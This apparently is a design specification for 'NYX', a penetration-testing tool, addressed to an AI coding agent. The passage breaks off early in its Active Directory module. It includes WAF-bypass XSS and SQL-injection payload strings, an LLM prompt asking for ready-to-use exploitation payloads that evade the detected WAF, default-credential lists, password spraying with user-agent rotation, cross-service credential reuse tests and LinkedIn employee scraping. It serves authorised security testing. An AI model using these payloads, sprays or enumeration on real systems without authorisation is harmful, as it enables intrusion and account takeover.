# NYX — Power Features Specification
## Eight Enhancement Modules for Production Pentesting

> **Purpose of this document:** This is a complete specification for eight enhancement modules that make NYX more powerful as a real-world penetration testing tool. Each module is self-contained and can be implemented independently or in any combination. The AI coding agent should ask the operator which modules to implement before beginning, then produce an implementation plan covering database changes, new packages, adapter additions, API endpoints, and UI updates for each selected module.
>
> **Read first:** `docs/nyx-project-spec.md` for the base architecture and current audit/source-aware behavior, plus `docs/implementation-plan.md` for implementation traceability. All modules in this document build on top of the existing NYX codebase — nothing here replaces existing functionality.
>
> **Current implementation note:** All eight modules now have a deep-but-safe v1
> slice in the repository. Optional providers degrade gracefully, fixture-safe
> active validation is explicit, credentials are paced and redacted by default,
> callbacks are correlated without exfiltration, and power evidence appears in
> reports/UI. The specifications below remain the complete target state for
> future provider breadth, Linux-tool hardening, and carefully reviewed
> automation.

---

## How to use this document

Detailed implementation plans for each module live in
`docs/power-feature-plans/`. Use those plans for implementation handoff; this
document remains the product/source specification.

Each module is fully specified. Before writing any code, the agent should:

1. Read the full document
2. Ask the operator: "Which modules would you like to implement?"
3. For selected modules, read the matching detailed plan in `docs/power-feature-plans/`
4. Implement selected modules in the order specified in the implementation plan
5. Leave unselected modules untouched — their specs remain in this document for future implementation

---

## Module Index

| # | Module | Summary | Difficulty | Status |
|---|---|---|---|---|
| 1 | AI Payload Generation | Context-aware WAF bypass and injection payload generation | High | Deep safe slice implemented |
| 2 | Continuous Attack Surface Monitoring | Scheduled scans with diff/alerting | Medium | Deep safe slice implemented |
| 3 | Credential Testing | Default creds, password spray, credential correlation | Medium | Deep safe slice implemented |
| 4 | OSINT Expansion | Employee enumeration, GitHub intel, job posting analysis, Shodan | Medium | Deep safe slice implemented |
| 5 | Active Directory & Internal Network | BloodHound, Kerberoasting, SMB/LDAP, relay attacks | High | Deep safe slice implemented |
| 6 | Evasion & Stealth Mode | Rate limiting, traffic blending, proxy chains, WAF bypass | Medium | Deep safe slice implemented |
| 7 | Automated PoC & Impact Demonstration | Safe automated exploitation, canary capture, evidence generation | High | Deep safe slice implemented |
| 8 | Burp Suite Bridge | Import/export, Collaborator/Interactsh integration | Medium | Deep safe slice implemented |

---

## Module 1: AI Payload Generation

### Overview

When a vulnerability is confirmed by a dynamic tool, NYX's LLM generates context-aware custom payloads tuned to the specific target environment. This bridges the gap between "vulnerability detected" and "exploitation ready" — producing payloads that account for the detected WAF, database engine, CSP policy, and application behaviour rather than relying on generic tool defaults.

### How it fits into the existing pipeline

This module adds a new LLM analyst pass that runs immediately after a finding is confirmed and persisted. It reads the finding, pulls all relevant context from the session DB (detected WAF, tech stack, CSP headers, database engine, framework), and generates a ranked list of targeted payloads stored as a new `payloads` table. The payloads are surfaced in the web UI alongside the finding and optionally fed back to the original tool for automated validation.

### New database table: `payloads`

```sql
CREATE TABLE payloads (
    id              TEXT PRIMARY KEY,
    finding_id      TEXT NOT NULL REFERENCES findings(id) ON DELETE CASCADE,
    session_id      TEXT NOT NULL REFERENCES sessions(id) ON DELETE CASCADE,
    payload_type    TEXT NOT NULL,
    -- 'xss' | 'sqli' | 'ssrf' | 'ssti' | 'xxe' | 'cmd_injection' | 'open_redirect'
    payload         TEXT NOT NULL,
    context         TEXT NOT NULL DEFAULT '',
    -- what this payload is designed to bypass/achieve
    target_waf      TEXT NOT NULL DEFAULT '',
    -- detected WAF this payload is crafted for (empty = generic)
    target_db       TEXT NOT NULL DEFAULT '',
    -- detected DB engine for SQLi payloads
    bypass_technique TEXT NOT NULL DEFAULT '',
    -- e.g. "unicode encoding", "case variation", "comment injection"
    confidence      REAL NOT NULL DEFAULT 0.0,
    -- LLM confidence this payload will succeed
    validated       BOOLEAN NOT NULL DEFAULT FALSE,
    -- true if the payload was tested and confirmed working
    validated_response TEXT NOT NULL DEFAULT '',
    -- captured response when validated=true
    rank            INTEGER NOT NULL DEFAULT 0,
    -- ordering within a finding's payload set (1 = highest confidence)
    created_at      DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
);
CREATE INDEX idx_payloads_finding ON payloads(finding_id);
CREATE INDEX idx_payloads_session ON payloads(session_id);
```

### New package: `internal/payload/`

```
internal/payload/
├── generator.go       # orchestrates payload generation
├── waf.go             # WAF detection and bypass technique library
├── sqli.go            # SQL injection payload builder
├── xss.go             # XSS payload builder
├── ssrf.go            # SSRF payload builder
├── ssti.go            # SSTI payload builder
├── validator.go       # tests generated payloads against the target
└── prompts.go         # LLM prompts for payload generation
```

### WAF detection

Before generating payloads, NYX must identify whether a WAF is present and which one. Extend the fingerprint phase to include WAF detection using the following signals:

- Response headers: `CF-RAY` (Cloudflare), `X-Sucuri-ID` (Sucuri), `X-Powered-By-Litespeed`, `X-Amzn-Requestid` (AWS WAF), `X-CDN` (various)
- Response body patterns when a known malicious payload is sent: specific error messages, redirect to captcha pages, HTTP 406/412/444 responses
- Nuclei WAF detection templates (already in the vuln scan phase)
- Timing patterns: WAFs often add consistent latency

Store the detected WAF as a `Technology` record with `category = "waf"` so all subsequent phases have access to it.

**Known WAF fingerprints to implement:**
- Cloudflare
- AWS WAF
- Akamai
- Imperva/Incapsula
- F5 BIG-IP ASM
- ModSecurity (generic)
- Barracuda
- Sucuri
- Fastly (as CDN/WAF)

### LLM payload generation prompt

The payload generator calls the LLM with the following context assembled from the session DB:

```go
type PayloadGenerationContext struct {
    Finding        models.Finding
    DetectedWAF    string            // from technologies table, category="waf"
    DetectedDB     string            // from technologies table, category="database"
    Framework      string            // from technologies table, category="framework"
    Language       string            // from technologies table, category="language"
    CSPHeader      string            // from http_evidence headers
    CORSPolicy     string            // from http_evidence headers
    ServerHeader   string            // Server: header value
    ExistingPayloads []string        // payloads already tried by the original tool
    HTTPMethod     string            // GET/POST/PUT etc.
    ContentType    string            // application/json, multipart/form-data, etc.
}
```

**System prompt for payload generation:**
```
You are an expert penetration tester specialising in web application exploitation.
You will be given a confirmed vulnerability finding and details about the target environment.
Generate a ranked list of exploitation payloads optimised for this specific environment.

Rules:
- Tailor every payload to the detected WAF, database engine, and framework
- Use techniques known to bypass the specific WAF detected
- Payloads must be ready to use — URL-encoded where appropriate, escaped for the correct context
- Do not generate payloads that are identical to what the original tool already tried
- Rank payloads by estimated probability of success given the detected environment
- Explain the bypass technique used in each payload

Respond ONLY with a JSON array:
[
  {
    "payload": "<the exact payload string>",
    "context": "<where and how to use it — parameter, header, body field>",
    "bypass_technique": "<technique name and brief explanation>",
    "confidence": <0.0–1.0>,
    "rank": <integer starting at 1>
  }
]
Generate between 3 and 8 payloads. No preamble, no markdown, no text outside the JSON.
```

### WAF-specific bypass techniques library

Implement a static knowledge base of bypass techniques per WAF and vulnerability type. The LLM uses this as reference material via the system prompt:

**Cloudflare XSS bypasses:**
- Unicode character substitution: `\u003cscript\u003e`
- HTML entity encoding in attributes: `<img src=x onerror=&#97;lert(1)>`
- SVG-based vectors: `<svg><animate onbegin=alert(1)>`
- DOM-based vectors avoiding `script` keyword
- Template literal payloads: `` `${alert(1)}` ``

**ModSecurity SQLi bypasses:**
- Inline comment injection: `1/**/OR/**/1=1`
- URL double-encoding: `%2527`
- Case variation: `SeLeCt`
- HTTP parameter pollution
- JSON-based injection for JSON column types

**AWS WAF SQLi bypasses:**
- Whitespace substitution with `%09`, `%0a`, `%0d`
- Scientific notation: `1e0UNION`
- Negative numbers in LIMIT: `LIMIT 1 OFFSET -1`

Implement these as a `waf_bypass_library.go` file containing a map of `WAFName → VulnType → []BypassTechnique`.

### Payload validation

After generation, optionally validate payloads against the live target:

```go
type ValidationResult struct {
    PayloadID      string
    Validated      bool
    ResponseCode   int
    ResponseBody   string  // truncated to 5KB
    ResponseTime   int64   // ms
    Evidence       string  // what in the response confirms success
}

func (v *Validator) Validate(ctx context.Context, finding models.Finding, payload models.Payload) (ValidationResult, error) {
    // Construct and send the HTTP request with the payload in the appropriate location
    // Check the response for success indicators:
    //   XSS: reflection of payload in response body without encoding
    //   SQLi: error messages, timing differences, data in response
    //   SSRF: out-of-band callback received (via Interactsh)
    //   SSTI: mathematical expression evaluation ({{7*7}} → 49)
    // Store validated=true and the evidence in the payloads table
}
```

### API endpoints

```
POST /api/sessions/{id}/findings/{findingId}/generate-payloads
    Body: { "force_regenerate": false }
    Triggers LLM payload generation for a specific finding

GET  /api/sessions/{id}/findings/{findingId}/payloads
    Returns all generated payloads for a finding, sorted by rank

POST /api/sessions/{id}/payloads/{payloadId}/validate
    Attempts to validate the payload against the live target

GET  /api/sessions/{id}/payloads
    All payloads across the session, filterable by type and validated status
```

### Web UI additions

In the finding detail panel, add a **Payloads** tab alongside the existing Evidence, HTTP, and CVE tabs:

- List of generated payloads ranked by confidence
- Each payload shows: the payload string in a copyable code block, the bypass technique used, confidence bar, validated badge if confirmed
- "Generate Payloads" button at the top that triggers the LLM pass
- "Validate" button per payload that tests it against the target
- Filter by payload type and WAF bypass technique

### CLI additions

```
nyx payloads generate <session-id> --finding <finding-id>
nyx payloads generate <session-id> --all           # generate for all confirmed findings
nyx payloads validate <session-id> --finding <finding-id>
nyx payloads list <session-id> [--validated-only]
```

---

## Module 2: Continuous Attack Surface Monitoring

### Overview

A scheduled scan mode that runs against saved session configurations on a recurring schedule, diffs the results against a baseline, and alerts when the attack surface changes. Turns NYX from a point-in-time tool into a continuous monitoring platform — invaluable for bug bounty and long-running red team operations.

### New database tables

```sql
CREATE TABLE monitor_configs (
    id              TEXT PRIMARY KEY,
    name            TEXT NOT NULL,
    target_input    TEXT NOT NULL,
    in_scope        TEXT NOT NULL DEFAULT '[]',
    out_of_scope    TEXT NOT NULL DEFAULT '[]',
    schedule        TEXT NOT NULL,
    -- cron expression e.g. "0 */6 * * *" = every 6 hours
    enabled_phases  TEXT NOT NULL DEFAULT '["recon","fingerprint"]',
    -- monitoring typically runs lighter phases only
    alert_on        TEXT NOT NULL DEFAULT '["new_subdomain","new_port","new_finding","cert_change"]',
    -- JSON array of alert trigger types
    notification_config TEXT NOT NULL DEFAULT '{}',
    -- JSON: {"slack_webhook": "...", "email": "..."}
    baseline_session_id TEXT REFERENCES sessions(id),
    -- the session used as comparison baseline
    last_run_at     DATETIME,
    next_run_at     DATETIME,
    enabled         BOOLEAN NOT NULL DEFAULT TRUE,
    created_at      DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE monitor_runs (
    id              TEXT PRIMARY KEY,
    config_id       TEXT NOT NULL REFERENCES monitor_configs(id) ON DELETE CASCADE,
    session_id      TEXT NOT NULL REFERENCES sessions(id),
    -- the session created for this run
    status          TEXT NOT NULL DEFAULT 'running',
    changes_found   INTEGER NOT NULL DEFAULT 0,
    started_at      DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    completed_at    DATETIME
);

CREATE TABLE surface_changes (
    id              TEXT PRIMARY KEY,
    monitor_run_id  TEXT NOT NULL REFERENCES monitor_runs(id) ON DELETE CASCADE,
    session_id      TEXT NOT NULL REFERENCES sessions(id),
    change_type     TEXT NOT NULL,
    -- 'new_subdomain' | 'new_port' | 'new_finding' | 'cert_change'
    -- 'new_endpoint' | 'service_change' | 'finding_resolved' | 'new_technology'
    severity        TEXT NOT NULL DEFAULT 'info',
    -- how significant is this change: critical/high/medium/low/info
    description     TEXT NOT NULL,
    previous_value  TEXT NOT NULL DEFAULT '',
    current_value   TEXT NOT NULL DEFAULT '',
    target_id       TEXT REFERENCES targets(id),
    finding_id      TEXT REFERENCES findings(id),
    alerted         BOOLEAN NOT NULL DEFAULT FALSE,
    created_at      DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
);
CREATE INDEX idx_surface_changes_run    ON surface_changes(monitor_run_id);
CREATE INDEX idx_surface_changes_type   ON surface_changes(change_type);
CREATE INDEX idx_surface_changes_alerted ON surface_changes(alerted);
```

### New package: `internal/monitor/`

```
internal/monitor/
├── scheduler.go       # cron scheduler, manages monitor_configs
├── runner.go          # executes a monitoring run, creates session, runs phases
├── differ.go          # diffs current run against baseline session
├── alerter.go         # sends notifications via configured channels
└── notifiers/
    ├── slack.go       # Slack webhook notifications
    ├── discord.go     # Discord webhook notifications
    └── email.go       # SMTP email notifications
```

### Scheduler

Use `github.com/robfig/cron/v3` for cron scheduling. The scheduler starts when `nyx serve` runs and loads all enabled `monitor_configs` from the DB.

```go
type Scheduler struct {
    cron    *cron.Cron
    db      *db.Queries
    engine  *engine.DAGEngine
    alerter *Alerter
}

func (s *Scheduler) Start() error {
    configs, _ := s.db.ListEnabledMonitorConfigs(ctx)
    for _, cfg := range configs {
        s.addJob(cfg)
    }
    s.cron.Start()
    return nil
}

func (s *Scheduler) addJob(cfg models.MonitorConfig) {
    s.cron.AddFunc(cfg.Schedule, func() {
        s.runMonitor(cfg)
    })
}
```

### Differ

The differ compares the current monitoring run's session against the baseline session and produces `SurfaceChange` records:

```go
func (d *Differ) Diff(ctx context.Context, baselineSessionID, currentSessionID string) ([]models.SurfaceChange, error) {
    // Compare targets:
    //   New hosts in current not in baseline → change_type="new_subdomain"
    //   New open ports on existing hosts → change_type="new_port"
    //   Port closed that was previously open → change_type="service_change"
    //
    // Compare technologies:
    //   New technology detected → change_type="new_technology"
    //   Version change on existing technology → change_type="service_change"
    //
    // Compare findings:
    //   New finding in current not in baseline (matched by URL+type+tool) → change_type="new_finding"
    //   Finding in baseline not in current → change_type="finding_resolved"
    //
    // Compare certificates (from testssl or httpx output):
    //   Certificate CN/SANs changed → change_type="cert_change"
    //   Certificate expiry within 30 days → change_type="cert_change" severity=high
    //
    // Compare endpoints (from ffuf/waybackurls):
    //   New endpoint not in baseline → change_type="new_endpoint"
}
```

### Alert severity mapping

| Change type | Default severity |
|---|---|
| New critical/high finding | critical |
| New subdomain with open ports | high |
| New open port on existing host | medium |
| Certificate about to expire (<30 days) | high |
| Certificate changed | high |
| New technology detected | medium |
| New endpoint discovered | low |
| Finding resolved | info |

### Notification format

**Slack message (Block Kit):**
```json
{
  "blocks": [
    {
      "type": "header",
      "text": { "type": "plain_text", "text": "🔴 NYX Alert — New Critical Finding" }
    },
    {
      "type": "section",
      "fields": [
        { "type": "mrkdwn", "text": "*Target:* api.target.com" },
        { "type": "mrkdwn", "text": "*Change:* SQL Injection detected at /api/search" },
        { "type": "mrkdwn", "text": "*Severity:* Critical" },
        { "type": "mrkdwn", "text": "*Detected at:* 2025-01-15 14:23 UTC" }
      ]
    },
    {
      "type": "actions",
      "elements": [
        { "type": "button", "text": { "type": "plain_text", "text": "View in NYX" }, "url": "http://localhost:6767/sessions/..." }
      ]
    }
  ]
}
```

### CLI additions

```
nyx monitor create --target example.com --schedule "0 */6 * * *" --name "Example Corp"
nyx monitor list
nyx monitor enable <config-id>
nyx monitor disable <config-id>
nyx monitor run <config-id>           # trigger an immediate run
nyx monitor changes <config-id>       # show recent changes
nyx monitor delete <config-id>
```

### API endpoints

```
POST   /api/monitor/configs           Create a new monitor config
GET    /api/monitor/configs           List all monitor configs
GET    /api/monitor/configs/{id}      Get config details
PUT    /api/monitor/configs/{id}      Update config
DELETE /api/monitor/configs/{id}      Delete config
POST   /api/monitor/configs/{id}/run  Trigger immediate run
GET    /api/monitor/runs              List recent runs
GET    /api/monitor/runs/{id}/changes List surface changes for a run
PUT    /api/monitor/changes/{id}/alert-sent  Mark change as alerted
```

### Web UI additions

Add a **Monitor** page (`/monitor`) to the sidebar navigation:

- List of monitor configs with schedule, last run time, changes found count
- "New Monitor" button opens a form: target input, schedule picker (dropdown: hourly/daily/weekly/custom cron), alert channels
- Per-config: run history table, surface changes timeline, diff view comparing baseline vs current
- Changes feed: filterable by type and severity, shows previous and current values side by side
- Alert channel configuration: Slack webhook URL, Discord webhook URL, email SMTP settings

---

## Module 3: Credential Testing Module

### Overview

A dedicated scan phase that intelligently tests credentials across discovered services. Three capabilities: default credential testing for identified technologies, password spraying against discovered login endpoints, and credential correlation across all services when any credential is found.

### New scan phase: `credential_test`

Add `credential_test` as a new phase in the DAG, running after `vuln_scan`. It depends on all four existing phases completing first — it needs the full picture of discovered services, technologies, and endpoints before it can run.

```go
const PhaseCredentialTest Phase = "credential_test"
```

### New database table: `credential_findings`

```sql
CREATE TABLE credential_findings (
    id              TEXT PRIMARY KEY,
    session_id      TEXT NOT NULL REFERENCES sessions(id) ON DELETE CASCADE,
    target_id       TEXT NOT NULL REFERENCES targets(id) ON DELETE CASCADE,
    finding_id      TEXT REFERENCES findings(id),
    -- linked finding if this produced a confirmed vulnerability
    credential_type TEXT NOT NULL,
    -- 'default' | 'sprayed' | 'found_in_source' | 'found_in_response' | 'breach_db'
    username        TEXT NOT NULL DEFAULT '',
    password        TEXT NOT NULL DEFAULT '',
    -- store hashed version for sensitive engagements: config option
    service         TEXT NOT NULL DEFAULT '',
    -- e.g. "Jenkins", "Grafana", "SSH", "SMB"
    url             TEXT NOT NULL DEFAULT '',
    valid           BOOLEAN NOT NULL DEFAULT FALSE,
    -- confirmed working credential
    lockout_detected BOOLEAN NOT NULL DEFAULT FALSE,
    evidence        TEXT NOT NULL DEFAULT '',
    -- response snippet confirming valid credential
    created_at      DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
);
CREATE INDEX idx_cred_findings_session ON credential_findings(session_id);
CREATE INDEX idx_cred_findings_valid   ON credential_findings(valid);
```

### New package: `internal/creds/`

```
internal/creds/
├── engine.go          # orchestrates credential testing phase
├── defaults.go        # default credential database and tester
├── sprayer.go         # password spray engine with lockout detection
├── correlator.go      # tests found credentials across all services
├── hibp.go            # HaveIBeenPwned API client
└── wordlists/
    ├── spray.txt      # password spray wordlist (curated, ~50 passwords)
    └── defaults/
        ├── jenkins.yaml
        ├── grafana.yaml
        ├── tomcat.yaml
        ├── phpmyadmin.yaml
        ├── wordpress.yaml
        ├── cisco.yaml
        ├── fortinet.yaml
        └── ...        # one file per technology
```

### Default credential database format

```yaml
# internal/creds/wordlists/defaults/jenkins.yaml
technology: Jenkins
versions: ["*"]  # "*" = all versions, or specific version ranges
login_url_patterns:
  - "/j_acegi_security_check"
  - "/j_spring_security_check"
username_field: "j_username"
password_field: "j_password"
success_indicators:
  - response_code: 302
    location_header_contains: "/dashboard"
failure_indicators:
  - response_code: 200
    body_contains: "Invalid username or password"
lockout_indicators:
  - response_code: 403
  - body_contains: "locked"
credentials:
  - username: "admin"
    password: "admin"
  - username: "admin"
    password: "password"
  - username: "admin"
    password: "jenkins"
  - username: "jenkins"
    password: "jenkins"
```

**Technologies to include defaults for:**
Jenkins, Grafana, Kibana, Elasticsearch, Apache Tomcat Manager, phpMyAdmin, WordPress admin, Joomla admin, Drupal admin, GitLab, Gitea, Portainer, Rancher, Kubernetes Dashboard, Jupyter Notebook, RabbitMQ Management, Redis (no auth), MongoDB (no auth), MySQL (root no password), PostgreSQL, FTP (anonymous), Cisco IOS, Fortinet, Palo Alto, VMware vCenter, Proxmox, pfSense, OpenVPN Access Server, Nagios, Zabbix, SolarWinds, Splunk.

### Password spray engine

```go
type SprayConfig struct {
    Wordlist       []string      // password candidates
    Delay          time.Duration // between attempts (default: 3s)
    Jitter         time.Duration // random additional delay (default: 1s)
    MaxAttempts    int           // per username before stopping (default: 3)
    LockoutThreshold int         // failed attempts before declaring lockout (default: 5)
    UserAgentRotate bool         // rotate user agents between requests
}

type SprayEngine struct {
    config  SprayConfig
    client  *http.Client
    db      *db.Queries
}

func (s *SprayEngine) Spray(ctx context.Context, endpoint LoginEndpoint, usernames []string) ([]CredentialFinding, error) {
    // For each password in wordlist:
    //   For each username:
    //     Send authentication request
    //     Check response against success/failure/lockout indicators
    //     If lockout detected: stop immediately, flag the endpoint
    //     If success: store credential, continue testing other usernames
    //     Enforce delay + jitter between all requests
    //     Never exceed MaxAttempts per username
}
```

### Login endpoint discovery

The credential testing engine builds a list of login endpoints from:
- Findings with tag `admin-panel` (found by ffuf/nuclei)
- Source findings with kind `route` where value matches `/login`, `/admin`, `/auth`, `/signin`, `/dashboard`
- Technology records — if WordPress is detected, `/wp-login.php` is implied
- HTTP responses with forms containing password fields (found during enumeration)

### Credential correlator

When any valid credential is found (by default testing, spraying, or in source code via gitleaks), test it across all other discovered services:

```go
func (c *Correlator) CorrelateCredential(ctx context.Context, username, password string, sessionID string) []CredentialFinding {
    // Get all targets and their technologies from the session
    // For each target, determine which authentication protocols are available:
    //   HTTP basic auth: try all login endpoints
    //   SSH: attempt SSH auth if port 22 open
    //   SMB: attempt SMB auth if port 445 open
    //   FTP: attempt FTP auth if port 21 open
    //   RDP: attempt RDP auth if port 3389 open (check only, no shell)
    // Return all successful authentications as CredentialFinding records
    // Each successful cross-service auth creates a new Finding with severity=high
    // titled "Credential reuse — <service> accepts <technology> credentials"
}
```

### HaveIBeenPwned integration

For discovered email addresses (from OSINT module or from source findings), optionally check against the HaveIBeenPwned API:

```go
type HIBPClient struct {
    apiKey string
    rateLimit *rate.Limiter  // HIBP rate limit: 1 request per 1.5 seconds
}

func (h *HIBPClient) CheckEmail(ctx context.Context, email string) ([]Breach, error) {
    // GET https://haveibeenpwned.com/api/v3/breachedaccount/<email>
    // Returns list of breaches the email appears in
    // Store as SourceFinding kind="breach_db" for each email found in breaches
}
```

Disabled by default. Requires `--hibp-api-key` flag or config setting. Never call HIBP without explicit opt-in — the email addresses being checked belong to the target organisation.

### Configuration options for credential testing

```yaml
# In config.yaml
credential_testing:
  enabled: true
  default_creds: true
  spray: true
  spray_wordlist: ~/.nyx/wordlists/spray.txt  # custom wordlist path
  spray_delay_seconds: 3
  spray_jitter_seconds: 1
  spray_max_attempts_per_user: 3
  correlate_found_credentials: true
  hibp_enabled: false
  hibp_api_key: ""
  store_plaintext_passwords: true  # set false for sensitive engagements
```

### API endpoints

```
GET  /api/sessions/{id}/credentials              All credential findings
GET  /api/sessions/{id}/credentials?valid=true   Only valid credentials
POST /api/sessions/{id}/credentials/spray        Trigger spray against specific endpoint
POST /api/sessions/{id}/credentials/correlate    Test a specific credential across all services
POST /api/sessions/{id}/credentials/defaults     Run default cred testing against all tech
```

### Web UI additions

Add a **Credentials** tab to the session detail page:

- Summary card: valid credentials found, services tested, lockouts detected
- Credentials table: username, password (masked by default, toggle to reveal), service, valid badge, evidence snippet
- Lockout alerts: which endpoints locked accounts during testing
- Credential correlation map: shows which credentials work across which services (useful for lateral movement path visualization)
- "Run Default Creds" and "Run Spray" buttons with configuration modal

---

## Module 4: OSINT Expansion Module

### Overview

A new pre-recon phase (`osint`) that builds a comprehensive picture of the target organisation before any active scanning begins. Discovers employees, leaked code, technology clues from job postings, historical infrastructure data, and breach exposures — all passively, without touching the target directly.

### New scan phase: `osint`

Runs before `recon` as phase -1. All gathered data seeds subsequent phases.

### New database table: `osint_findings`

```sql
CREATE TABLE osint_findings (
    id          TEXT PRIMARY KEY,
    session_id  TEXT NOT NULL REFERENCES sessions(id) ON DELETE CASCADE,
    kind        TEXT NOT NULL,
    -- 'employee' | 'email' | 'github_leak' | 'job_posting_tech'
    -- | 'pastebin_mention' | 'breach' | 'shodan_historical' | 'dns_history'
    source      TEXT NOT NULL,
    -- 'linkedin' | 'github' | 'shodan' | 'censys' | 'jobposting' | 'hibp' | 'crtsh'
    value       TEXT NOT NULL,
    -- the actual discovered data
    metadata    TEXT NOT NULL DEFAULT '{}',
    -- JSON: additional context (e.g. employee title, breach date, etc.)
    confidence  REAL NOT NULL DEFAULT 0.8,
    actionable  BOOLEAN NOT NULL DEFAULT FALSE,
    -- true if this finding should seed another phase
    created_at  DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
);
CREATE INDEX idx_osint_session ON osint_findings(session_id);
CREATE INDEX idx_osint_kind    ON osint_findings(kind);
```

### New package: `internal/osint/`

```
internal/osint/
├── engine.go          # orchestrates OSINT phase
├── linkedin.go        # LinkedIn employee enumeration
├── github.go          # GitHub code leak and org intelligence
├── jobpostings.go     # job posting scraper and tech extractor
├── shodan.go          # Shodan API client
├── censys.go          # Censys API client
├── dnshistory.go      # DNS history via SecurityTrails/PassiveTotal
├── pastebin.go        # Pastebin/pastesites monitoring
└── emailformats.go    # email format discovery and generation
```

### LinkedIn employee enumeration

```go
type LinkedInScraper struct {
    // Uses unauthenticated public search — no credentials required
    // Searches: site:linkedin.com/in/ "<company name>" "<role keywords>"
    // via search engine API (SerpAPI or direct SERP parsing)
    serpAPIKey string
}

func (l *LinkedInScraper) EnumerateEmployees(ctx context.Context, companyName string) ([]Employee, error) {
    // Query: site:linkedin.com/in "<company name>"
    // Extract: name, job title, location from search result snippets
    // Store as osint_finding kind="employee"
    // Derive likely email format from discovered names (see emailformats.go)
}

type Employee struct {
    Name       string
    Title      string
    Department string
    LikelyEmail string  // derived from discovered email format
}
```

**Email format discovery:** When multiple employees are found, attempt to determine the email format by:
1. Checking `hunter.io` API (free tier) for the domain's email format
2. Pattern matching: if any employee email is discovered elsewhere (GitHub commits, job postings), infer the format
3. Common formats to try: `firstname.lastname@domain`, `f.lastname@domain`, `firstname@domain`, `flastname@domain`

### GitHub intelligence

```go
type GitHubScanner struct {
    token string  // GitHub personal access token (required for higher rate limits)
}

func (g *GitHubScanner) ScanOrganisation(ctx context.Context, orgName, domain string) ([]GitHubFinding, error) {
    // 1. Search GitHub for the organisation name and find their org account
    //    GET /search/users?q=<orgname>+type:org
    //
    // 2. List all public repositories
    //    GET /orgs/<orgname>/repos
    //
    // 3. For each repo, scan recent commits for:
    //    - Email addresses matching the target domain
    //    - Internal hostnames (matches known internal naming patterns)
    //    - API keys and secrets (supplement trufflehog with targeted regex)
    //
    // 4. Search GitHub code for target domain:
    //    GET /search/code?q=<domain>+NOT+org:<orgname>
    //    This finds external repos referencing the target — often leaked configs
    //
    // 5. Search GitHub for target-specific strings:
    //    Internal tool names, VPN endpoints, internal domain names found during recon
}

type GitHubFinding struct {
    RepoURL    string
    FilePath   string
    CommitSHA  string
    Kind       string  // "api_key" | "internal_hostname" | "email" | "internal_url"
    Value      string
    Author     string
    CommitDate time.Time
}
```

Store valuable findings as `osint_finding kind="github_leak"` and also create `Finding` records for confirmed secrets with `severity=critical`, `tool_id="osint/github"`.

### Job posting technology extraction

```go
func (j *JobPostingScraper) AnalysePostings(ctx context.Context, companyName, domain string) ([]TechClue, error) {
    // Scrape job postings from:
    //   - LinkedIn Jobs API (unauthenticated search)
    //   - Indeed (search scrape)
    //   - Glassdoor (search scrape)
    //   - Company careers page (discovered via /careers, /jobs paths during recon)
    //
    // Send collected job posting text to LLM:
    // "Extract all technologies, frameworks, infrastructure tools, and internal
    //  tool names mentioned in these job postings. For each technology, note
    //  whether it implies the company uses it internally or is just a requirement."
    //
    // LLM returns structured list of technologies with confidence scores
    // Store as Technology records in the session DB and osint_findings
}

type TechClue struct {
    Technology  string
    Version     string  // if mentioned
    Context     string  // the sentence mentioning it
    Confidence  float64
}
```

### Shodan integration

```go
type ShodanClient struct {
    apiKey string
}

func (s *ShodanClient) QueryTarget(ctx context.Context, domain string, ipRanges []string) (ShodanResult, error) {
    // 1. Search by domain: GET /shodan/host/search?query=hostname:<domain>
    //    Returns all hosts Shodan has seen associated with the domain
    //
    // 2. For each discovered IP range: GET /shodan/host/<ip>
    //    Returns: open ports, services, banners, vulnerabilities Shodan has detected
    //
    // 3. Historical data: GET /shodan/host/<ip>/history
    //    Returns services that were previously exposed — often more interesting than current
    //
    // 4. Map Shodan CVE detections to our cve_matches table
    //    Shodan sometimes knows about vulns we haven't scanned for yet
    //
    // Create Target records for newly discovered hosts
    // Create Technology records from Shodan banner data
    // Create CVEMatch records from Shodan CVE detections
}
```

Requires `shodan_api_key` in config. Disable gracefully if not configured.

### DNS history

```go
func (d *DNSHistoryClient) QueryHistory(ctx context.Context, domain string) ([]DNSRecord, error) {
    // Query SecurityTrails API (or passive DNS via CIRCL if no API key):
    // GET https://api.securitytrails.com/v1/history/<domain>/dns/a
    // Returns historical A records — IP addresses the domain previously pointed to
    //
    // Historical IPs are often:
    //   - Old servers with fewer security controls
    //   - Staging/dev environments
    //   - Direct IPs that bypass Cloudflare
    //
    // Store as osint_finding kind="dns_history"
    // Add historical IPs to the target discovery queue
}
```

### OSINT phase seeding

After the OSINT phase completes, seed subsequent phases with the discovered data:

- Discovered employee emails → seed credential testing module's username list
- GitHub-discovered internal hostnames → add to recon target list
- Job posting tech stack → pre-populate technology findings before fingerprinting runs
- Shodan-discovered hosts → add as targets for the recon phase
- Historical IPs → add as out-of-band targets for recon

### API endpoints

```
GET /api/sessions/{id}/osint              All OSINT findings
GET /api/sessions/{id}/osint?kind=employee  Filter by kind
GET /api/sessions/{id}/osint/employees    Employee list with derived emails
GET /api/sessions/{id}/osint/github       GitHub leaks
GET /api/sessions/{id}/osint/tech-clues   Job posting tech discoveries
```

### Web UI additions

Add an **OSINT** tab to the session detail page:

- Employee directory: names, titles, derived emails, breach status
- GitHub leaks: list of repos, files, and leaked values (secrets masked by default)
- Tech intelligence: technologies inferred from job postings with confidence scores
- Attack surface seeds: new hosts/IPs discovered through OSINT, status of their inclusion in the active scan
- Shodan historical timeline: chart of what services were exposed on target IPs over time

### Configuration

```yaml
osint:
  enabled: true
  linkedin: true
  github: true
  github_token: ""          # optional, higher rate limits
  job_postings: true
  shodan: true
  shodan_api_key: ""        # required for Shodan
  dns_history: true
  securitytrails_api_key: "" # optional, CIRCL used as fallback
  hibp_api_key: ""           # optional, breach checking
  serp_api_key: ""           # for LinkedIn employee search
```

---

## Module 5: Active Directory & Internal Network Module

### Overview

A suite of tools for internal network penetration testing. Activates automatically when the target scope includes private IP ranges (RFC 1918). Integrates with BloodHound for AD attack path analysis, automates Kerberoasting and relay attack detection, and enumerates SMB/LDAP services.

### Detection of internal scope

```go
func isInternalScope(session models.Session) bool {
    privateRanges := []string{
        "10.0.0.0/8",
        "172.16.0.0/12",
        "192.168.0.0/16",
        "169.254.0.0/16",
